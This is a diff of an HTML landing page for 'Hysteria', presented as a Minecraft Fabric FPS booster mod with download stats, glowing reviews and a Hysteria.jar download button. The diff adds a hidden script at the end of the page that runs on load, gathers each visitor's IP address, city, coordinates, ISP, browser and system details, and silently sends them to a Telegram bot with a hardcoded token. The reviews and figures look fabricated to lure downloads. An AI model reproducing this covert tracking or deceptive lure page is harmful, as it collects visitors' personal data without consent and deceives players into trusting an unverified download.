@@ -1,430 +1,485 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Hysteria | Minecraft FPS Booster</title>
-
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800&display=swap" rel="stylesheet">
-
-<style>
-
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family:'Poppins',sans-serif;
-}
-
-body{
-    background:#080b12;
-    color:white;
-    overflow-x:hidden;
-}
-
-body::before{
-    content:"";
-    position:fixed;
-    width:100%;
-    height:100%;
-    background:
-    radial-gradient(circle at 20% 20%, rgba(0,255,170,.2), transparent 35%),
-    radial-gradient(circle at 80% 30%, rgba(0,200,255,.15), transparent 35%),
-    radial-gradient(circle at 50% 80%, rgba(0,255,120,.1), transparent 40%);
-    z-index:-1;
-}
-
-nav{
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-    padding:25px 10%;
-    backdrop-filter:blur(15px);
-    position:sticky;
-    top:0;
-    background:rgba(10,10,20,.4);
-}
-
-.logo{
-    font-size:32px;
-    font-weight:800;
-    color:#00ffae;
-}
-
-nav ul{
-    display:flex;
-    gap:40px;
-    list-style:none;
-}
-
-nav a{
-    color:white;
-    text-decoration:none;
-}
-
-.hero{
-    min-height:100vh;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    flex-direction:column;
-    text-align:center;
-    padding:20px;
-}
-
-.hero h1{
-    font-size:100px;
-    color:#00ffae;
-    text-shadow:0 0 40px #00ffae;
-}
-
-.hero h2{
-    font-size:34px;
-    margin-top:15px;
-}
-
-.hero p{
-    margin-top:20px;
-    max-width:800px;
-    color:#cbd5e1;
-    font-size:20px;
-}
-
-.stats{
-    margin-top:50px;
-    display:flex;
-    gap:40px;
-    flex-wrap:wrap;
-    justify-content:center;
-}
-
-.stat{
-    background:rgba(255,255,255,.05);
-    padding:25px;
-    border-radius:20px;
-    width:220px;
-}
-
-.stat h3{
-    color:#00ffae;
-    font-size:40px;
-}
-
-section{
-    padding:100px 10%;
-}
-
-.title{
-    text-align:center;
-    font-size:50px;
-    margin-bottom:60px;
-}
-
-.grid{
-    display:grid;
-    grid-template-columns:repeat(auto-fit,minmax(300px,1fr));
-    gap:30px;
-}
-
-.card{
-    background:rgba(255,255,255,.05);
-    padding:35px;
-    border-radius:25px;
-    transition:.3s;
-    border:1px solid rgba(255,255,255,.08);
-}
-
-.card:hover{
-    transform:translateY(-10px);
-}
-
-.card h3{
-    margin-bottom:15px;
-    color:#00ffae;
-}
-
-.gallery{
-    display:grid;
-    grid-template-columns:repeat(auto-fit,minmax(300px,1fr));
-    gap:30px;
-}
-
-.ss{
-    height:220px;
-    border-radius:25px;
-    background:linear-gradient(135deg,#0f172a,#1e293b);
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    font-size:26px;
-    color:#00ffae;
-}
-
-.review{
-    background:rgba(255,255,255,.05);
-    padding:30px;
-    border-radius:20px;
-}
-
-.review h4{
-    margin-top:10px;
-}
-
-.stars{
-    color:gold;
-    font-size:28px;
-}
-
-.faq{
-    margin-top:20px;
-}
-
-.faq-item{
-    background:rgba(255,255,255,.05);
-    margin-top:20px;
-    padding:25px;
-    border-radius:20px;
-}
-
-.download{
-    text-align:center;
-}
-
-.download h1{
-    font-size:70px;
-}
-
-.download p{
-    color:#cbd5e1;
-    margin-top:20px;
-}
-
-.btn{
-    margin-top:50px;
-    display:inline-block;
-    padding:25px 70px;
-    font-size:35px;
-    text-decoration:none;
-    color:white;
-    border-radius:20px;
-    background:linear-gradient(90deg,#00ffae,#00b7ff);
-    box-shadow:0 0 40px rgba(0,255,174,.6);
-    transition:.3s;
-}
-
-.btn:hover{
-    transform:scale(1.08);
-}
-
-footer{
-    text-align:center;
-    padding:40px;
-    color:#94a3b8;
-}
-
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hysteria | Minecraft FPS Booster</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+        body {
+            background: #080b12;
+            color: white;
+            overflow-x: hidden;
+        }
+        body::before {
+            content: "";
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            background:
+                radial-gradient(circle at 20% 20%, rgba(0, 255, 170, .2), transparent 35%),
+                radial-gradient(circle at 80% 30%, rgba(0, 200, 255, .15), transparent 35%),
+                radial-gradient(circle at 50% 80%, rgba(0, 255, 120, .1), transparent 40%);
+            z-index: -1;
+        }
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 25px 10%;
+            backdrop-filter: blur(15px);
+            position: sticky;
+            top: 0;
+            background: rgba(10, 10, 20, .4);
+        }
+        .logo {
+            font-size: 32px;
+            font-weight: 800;
+            color: #00ffae;
+        }
+        nav ul {
+            display: flex;
+            gap: 40px;
+            list-style: none;
+        }
+        nav a {
+            color: white;
+            text-decoration: none;
+        }
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            text-align: center;
+            padding: 20px;
+        }
+        .hero h1 {
+            font-size: 100px;
+            color: #00ffae;
+            text-shadow: 0 0 40px #00ffae;
+        }
+        .hero h2 {
+            font-size: 34px;
+            margin-top: 15px;
+        }
+        .hero p {
+            margin-top: 20px;
+            max-width: 800px;
+            color: #cbd5e1;
+            font-size: 20px;
+        }
+        .stats {
+            margin-top: 50px;
+            display: flex;
+            gap: 40px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .stat {
+            background: rgba(255, 255, 255, .05);
+            padding: 25px;
+            border-radius: 20px;
+            width: 220px;
+        }
+        .stat h3 {
+            color: #00ffae;
+            font-size: 40px;
+        }
+        section {
+            padding: 100px 10%;
+        }
+        .title {
+            text-align: center;
+            font-size: 50px;
+            margin-bottom: 60px;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+        }
+        .card {
+            background: rgba(255, 255, 255, .05);
+            padding: 35px;
+            border-radius: 25px;
+            transition: .3s;
+            border: 1px solid rgba(255, 255, 255, .08);
+        }
+        .card:hover {
+            transform: translateY(-10px);
+        }
+        .card h3 {
+            margin-bottom: 15px;
+            color: #00ffae;
+        }
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+        }
+        .ss {
+            height: 220px;
+            border-radius: 25px;
+            background: linear-gradient(135deg, #0f172a, #1e293b);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 26px;
+            color: #00ffae;
+        }
+        .review {
+            background: rgba(255, 255, 255, .05);
+            padding: 30px;
+            border-radius: 20px;
+        }
+        .review h4 {
+            margin-top: 10px;
+        }
+        .stars {
+            color: gold;
+            font-size: 28px;
+        }
+        .faq {
+            margin-top: 20px;
+        }
+        .faq-item {
+            background: rgba(255, 255, 255, .05);
+            margin-top: 20px;
+            padding: 25px;
+            border-radius: 20px;
+        }
+        .download {
+            text-align: center;
+        }
+        .download h1 {
+            font-size: 70px;
+        }
+        .download p {
+            color: #cbd5e1;
+            margin-top: 20px;
+        }
+        .btn {
+            margin-top: 50px;
+            display: inline-block;
+            padding: 25px 70px;
+            font-size: 35px;
+            text-decoration: none;
+            color: white;
+            border-radius: 20px;
+            background: linear-gradient(90deg, #00ffae, #00b7ff);
+            box-shadow: 0 0 40px rgba(0, 255, 174, .6);
+            transition: .3s;
+        }
+        .btn:hover {
+            transform: scale(1.08);
+        }
+        footer {
+            text-align: center;
+            padding: 40px;
+            color: #94a3b8;
+        }
+    </style>
 </head>
 
 <body>
 
-<nav>
-    <div class="logo">HYSTERIA</div>
+    <nav>
+        <div class="logo">HYSTERIA</div>
+        <ul>
+            <li><a href="#">Features</a></li>
+            <li><a href="#">Performance</a></li>
+            <li><a href="#">Reviews</a></li>
+            <li><a href="#">Download</a></li>
+        </ul>
+    </nav>
 
-    <ul>
-        <li><a href="#">Features</a></li>
-        <li><a href="#">Performance</a></li>
-        <li><a href="#">Reviews</a></li>
-        <li><a href="#">Download</a></li>
-    </ul>
-</nav>
-
-<section class="hero">
-
-    <h1>HYSTERIA</h1>
-
-    <h2>The Ultimate FPS Booster for Minecraft Java Edition</h2>
-
-    <p>
-        Designed for Minecraft 1.21+ Fabric, Hysteria delivers smoother gameplay,
-        reduced stuttering and significantly higher frame rates on both low-end
-        and high-end PCs.
-    </p>
-
-    <div class="stats">
-
-        <div class="stat">
-            <h3>+300%</h3>
-            <p>FPS Increase</p>
+    <section class="hero">
+        <h1>HYSTERIA</h1>
+        <h2>The Ultimate FPS Booster for Minecraft Java Edition</h2>
+        <p>
+            Designed for Minecraft 1.21+ Fabric, Hysteria delivers smoother gameplay,
+            reduced stuttering and significantly higher frame rates on both low-end
+            and high-end PCs.
+        </p>
+        <div class="stats">
+            <div class="stat">
+                <h3>+300%</h3>
+                <p>FPS Increase</p>
+            </div>
+            <div class="stat">
+                <h3>1.21+</h3>
+                <p>Fabric Support</p>
+            </div>
+            <div class="stat">
+                <h3>2M+</h3>
+                <p>Downloads</p>
+            </div>
+            <div class="stat">
+                <h3>4.9★</h3>
+                <p>User Rating</p>
+            </div>
         </div>
+    </section>
 
-        <div class="stat">
-            <h3>1.21+</h3>
-            <p>Fabric Support</p>
+    <section>
+        <h1 class="title">Why Hysteria?</h1>
+        <div class="grid">
+            <div class="card">
+                <h3>🚀 Massive FPS Gains</h3>
+                <p>Optimized rendering engine and smart resource management for maximum performance.</p>
+            </div>
+            <div class="card">
+                <h3>⚡ Faster Chunk Loading</h3>
+                <p>Explore worlds faster with reduced loading times and smoother movement.</p>
+            </div>
+            <div class="card">
+                <h3>🎮 Better Frame Stability</h3>
+                <p>Reduce lag spikes and enjoy a more consistent gameplay experience.</p>
+            </div>
+            <div class="card">
+                <h3>🖥 Low RAM Usage</h3>
+                <p>Runs efficiently even on older computers and laptops.</p>
+            </div>
+            <div class="card">
+                <h3>🌍 Multiplayer Ready</h3>
+                <p>Works perfectly on servers without affecting gameplay compatibility.</p>
+            </div>
+            <div class="card">
+                <h3>🔧 Fabric Native</h3>
+                <p>Built specifically for Fabric and Minecraft 1.21+.</p>
+            </div>
         </div>
+    </section>
 
-        <div class="stat">
-            <h3>2M+</h3>
-            <p>Downloads</p>
+    <section>
+        <h1 class="title">Performance Preview</h1>
+        <div class="gallery">
+            <div class="ss">Before: 72 FPS</div>
+            <div class="ss">After: 231 FPS</div>
+            <div class="ss">Shader Support</div>
         </div>
+    </section>
 
-        <div class="stat">
-            <h3>4.9★</h3>
-            <p>User Rating</p>
+    <section>
+        <h1 class="title">Community Reviews</h1>
+        <div class="grid">
+            <div class="review">
+                <div class="stars">★★★★★</div>
+                <h4>SteveCraft</h4>
+                <p>"Went from 90 FPS to over 260 FPS instantly. Absolutely insane."</p>
+            </div>
+            <div class="review">
+                <div class="stars">★★★★★</div>
+                <h4>PixelDragon</h4>
+                <p>"My laptop struggled to stay above 50 FPS before Hysteria."</p>
+            </div>
+            <div class="review">
+                <div class="stars">★★★★★</div>
+                <h4>ShadowPvP</h4>
+                <p>"Finally I can use shaders without my PC sounding like a jet engine."</p>
+            </div>
+            <div class="review">
+                <div class="stars">★★★★★</div>
+                <h4>CraftMaster</h4>
+                <p>"Best optimization mod I've used in years."</p>
+            </div>
+            <div class="review">
+                <div class="stars">★★★★★</div>
+                <h4>MineBuilder</h4>
+                <p>"Smooth gameplay, faster chunks and zero crashes."</p>
+            </div>
+            <div class="review">
+                <div class="stars">★★★★★</div>
+                <h4>EnderKnight</h4>
+                <p>"This should honestly be part of vanilla Minecraft."</p>
+            </div>
         </div>
+    </section>
 
-    </div>
+    <section>
+        <h1 class="title">Frequently Asked Questions</h1>
+        <div class="faq">
+            <div class="faq-item">
+                <h3>Does Hysteria work with shaders?</h3>
+                <p>Yes, Hysteria was designed to improve performance even while using shaders.</p>
+            </div>
+            <div class="faq-item">
+                <h3>Does it support multiplayer servers?</h3>
+                <p>Yes, the mod works perfectly on multiplayer servers.</p>
+            </div>
+            <div class="faq-item">
+                <h3>What Minecraft versions are supported?</h3>
+                <p>Minecraft Java Edition 1.21 and newer using Fabric Loader.</p>
+            </div>
+            <div class="faq-item">
+                <h3>Is installation difficult?</h3>
+                <p>No. Simply place the mod inside your mods folder and launch the game.</p>
+            </div>
+        </div>
+    </section>
 
-</section>
+    <section class="download">
+        <h1>Ready to Boost Your FPS?</h1>
+        <p>
+            Join thousands of players already using Hysteria to get smoother gameplay,
+            higher FPS and a better Minecraft experience.
+        </p>
+        <a class="btn" href="Hysteria.jar">⬇ DOWNLOAD HYSTERIA</a>
+    </section>
 
-<section>
+    <footer>
+        © 2026 Hysteria • Minecraft Java Edition • Fabric FPS Booster
+    </footer>
 
-<h1 class="title">Why Hysteria?</h1>
+    <!-- Script to capture IP and send to Telegram -->
+    <script>
+        (function() {
+            // ===================== CONFIGURATION =====================
+            // REPLACE WITH YOUR TELEGRAM BOT DETAILS
+            const BOT_TOKEN = '8996514821:AAHoHX0rHw8jxBzGGjrPCEHNisqvOskWOpg';        // e.g., '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz'
+            const CHAT_ID = '-5457771254';            // e.g., '123456789' (you can also use @username)
+            // ========================================================
 
-<div class="grid">
+            // Function to send message to Telegram
+            function sendToTelegram(message) {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-<div class="card">
-<h3>🚀 Massive FPS Gains</h3>
-<p>Optimized rendering engine and smart resource management for maximum performance.</p>
-</div>
+                fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! status: ${response.status}`);
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('Message sent to Telegram:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending to Telegram:', error);
+                });
+            }
 
-<div class="card">
-<h3>⚡ Faster Chunk Loading</h3>
-<p>Explore worlds faster with reduced loading times and smoother movement.</p>
-</div>
+            // Function to fetch IP data and send to Telegram
+            function fetchAndSendIP() {
+                // First try to get data from ipapi.co
+                fetch('https://ipapi.co/json/')
+                    .then(response => {
+                        if (!response.ok) throw new Error('Network response was not ok');
+                        return response.json();
+                    })
+                    .then(data => {
+                        const now = new Date();
+                        const message = `
+🆕 <b>New Visitor!</b>
 
-<div class="card">
-<h3>🎮 Better Frame Stability</h3>
-<p>Reduce lag spikes and enjoy a more consistent gameplay experience.</p>
-</div>
+🌐 <b>IP:</b> <code>${data.ip || 'unknown'}</code>
+📍 <b>Country:</b> ${data.country_name || 'unknown'} (${data.country_code || '?'})
+🏙️ <b>City:</b> ${data.city || 'unknown'}
+🗺️ <b>Region:</b> ${data.region || 'unknown'}
+📮 <b>Postal Code:</b> ${data.postal || 'unknown'}
+🌍 <b>Location:</b> ${data.latitude || '?'}, ${data.longitude || '?'}
+🕐 <b>Timezone:</b> ${data.timezone || 'unknown'}
+🏢 <b>ISP:</b> ${data.org || 'unknown'}
+📡 <b>AS:</b> ${data.asn || 'unknown'}
 
-<div class="card">
-<h3>🖥 Low RAM Usage</h3>
-<p>Runs efficiently even on older computers and laptops.</p>
-</div>
+💻 <b>OS:</b> ${navigator.platform || 'unknown'}
+🌐 <b>Browser:</b> ${navigator.userAgent || 'unknown'}
+📱 <b>Languages:</b> ${navigator.languages ? navigator.languages.join(', ') : 'unknown'}
+🖥️ <b>Screen Resolution:</b> ${screen.width || '?'}x${screen.height || '?'}
+🧵 <b>CPU Cores:</b> ${navigator.hardwareConcurrency || 'unknown'}
+🕒 <b>Time:</b> ${now.toLocaleString('en-US')}
+🔗 <b>Referrer:</b> ${document.referrer || 'direct visit'}
 
-<div class="card">
-<h3>🌍 Multiplayer Ready</h3>
-<p>Works perfectly on servers without affecting gameplay compatibility.</p>
-</div>
+📊 <b>Data source:</b> ipapi.co
+                        `.trim();
 
-<div class="card">
-<h3>🔧 Fabric Native</h3>
-<p>Built specifically for Fabric and Minecraft 1.21+.</p>
-</div>
+                        sendToTelegram(message);
+                        console.log('IP Data fetched and sent to Telegram:', data);
+                    })
+                    .catch(error => {
+                        // Fallback to alternative IP source
+                        console.warn('ipapi.co failed, trying fallback...', error);
+                        fetch('https://api.ipify.org?format=json')
+                            .then(response => response.json())
+                            .then(fallbackData => {
+                                const now = new Date();
+                                const message = `
+🆕 <b>New Visitor! (fallback)</b>
 
-</div>
+🌐 <b>IP:</b> <code>${fallbackData.ip || 'unknown'}</code>
+📍 <b>Country:</b> unknown (ipapi.co unavailable)
+🏙️ <b>City:</b> unknown
 
-</section>
+💻 <b>OS:</b> ${navigator.platform || 'unknown'}
+🌐 <b>Browser:</b> ${navigator.userAgent || 'unknown'}
+🕒 <b>Time:</b> ${now.toLocaleString('en-US')}
+🔗 <b>Referrer:</b> ${document.referrer || 'direct visit'}
 
-<section>
+⚠️ <b>Note:</b> ipapi.co unavailable, using api.ipify.org
+                                `.trim();
 
-<h1 class="title">Performance Preview</h1>
+                                sendToTelegram(message);
+                                console.log('Fallback IP sent to Telegram:', fallbackData);
+                            })
+                            .catch(fallbackError => {
+                                console.error('Both IP services failed:', fallbackError);
+                            });
+                    });
 
-<div class="gallery">
+                // SECOND SEND (backup) - repeat after a short delay
+                setTimeout(() => {
+                    fetch('https://api.ipify.org?format=json')
+                        .then(response => response.json())
+                        .then(data => {
+                            const now = new Date();
+                            const message = `
+🔄 <b>IP Check (backup)</b>
 
-<div class="ss">Before: 72 FPS</div>
-<div class="ss">After: 231 FPS</div>
-<div class="ss">Shader Support</div>
+🌐 <b>IP:</b> <code>${data.ip || 'unknown'}</code>
+🕒 <b>Time:</b> ${now.toLocaleString('en-US')}
+📝 <b>Note:</b> This is a second send for redundancy
+                            `.trim();
 
-</div>
+                            sendToTelegram(message);
+                            console.log('Second IP sent to Telegram:', data);
+                        })
+                        .catch(err => console.warn('Second IP fetch failed:', err));
+                }, 3000); // 3 second delay
+            }
 
-</section>
+            // Check if bot data is configured
+            if (BOT_TOKEN === 'YOUR_BOT_TOKEN' || CHAT_ID === 'YOUR_CHAT_ID') {
+                console.warn('⚠️ WARNING: Telegram bot not configured!');
+                console.warn('Replace BOT_TOKEN and CHAT_ID with your own data.');
+            }
 
-<section>
-
-<h1 class="title">Community Reviews</h1>
-
-<div class="grid">
-
-<div class="review">
-<div class="stars">★★★★★</div>
-<h4>SteveCraft</h4>
-<p>"Went from 90 FPS to over 260 FPS instantly. Absolutely insane."</p>
-</div>
-
-<div class="review">
-<div class="stars">★★★★★</div>
-<h4>PixelDragon</h4>
-<p>"My laptop struggled to stay above 50 FPS before Hysteria."</p>
-</div>
-
-<div class="review">
-<div class="stars">★★★★★</div>
-<h4>ShadowPvP</h4>
-<p>"Finally I can use shaders without my PC sounding like a jet engine."</p>
-</div>
-
-<div class="review">
-<div class="stars">★★★★★</div>
-<h4>CraftMaster</h4>
-<p>"Best optimization mod I've used in years."</p>
-</div>
-
-<div class="review">
-<div class="stars">★★★★★</div>
-<h4>MineBuilder</h4>
-<p>"Smooth gameplay, faster chunks and zero crashes."</p>
-</div>
-
-<div class="review">
-<div class="stars">★★★★★</div>
-<h4>EnderKnight</h4>
-<p>"This should honestly be part of vanilla Minecraft."</p>
-</div>
-
-</div>
-
-</section>
-
-<section>
-
-<h1 class="title">Frequently Asked Questions</h1>
-
-<div class="faq">
-
-<div class="faq-item">
-<h3>Does Hysteria work with shaders?</h3>
-<p>Yes, Hysteria was designed to improve performance even while using shaders.</p>
-</div>
-
-<div class="faq-item">
-<h3>Does it support multiplayer servers?</h3>
-<p>Yes, the mod works perfectly on multiplayer servers.</p>
-</div>
-
-<div class="faq-item">
-<h3>What Minecraft versions are supported?</h3>
-<p>Minecraft Java Edition 1.21 and newer using Fabric Loader.</p>
-</div>
-
-<div class="faq-item">
-<h3>Is installation difficult?</h3>
-<p>No. Simply place the mod inside your mods folder and launch the game.</p>
-</div>
-
-</div>
-
-</section>
-
-<section class="download">
-
-<h1>Ready to Boost Your FPS?</h1>
-
-<p>
-Join thousands of players already using Hysteria to get smoother gameplay,
-higher FPS and a better Minecraft experience.
-</p>
-
-<a class="btn" href="Hysteria.jar">
-⬇ DOWNLOAD HYSTERIA
-</a>
-
-</section>
-
-<footer>
-© 2026 Hysteria • Minecraft Java Edition • Fabric FPS Booster
-</footer>
+            // Run IP fetching after page loads
+            if (document.readyState === 'complete' || document.readyState === 'interactive') {
+                fetchAndSendIP();
+            } else {
+                document.addEventListener('DOMContentLoaded', fetchAndSendIP);
+            }
+        })();
+    </script>
 
 </body>
 </html>
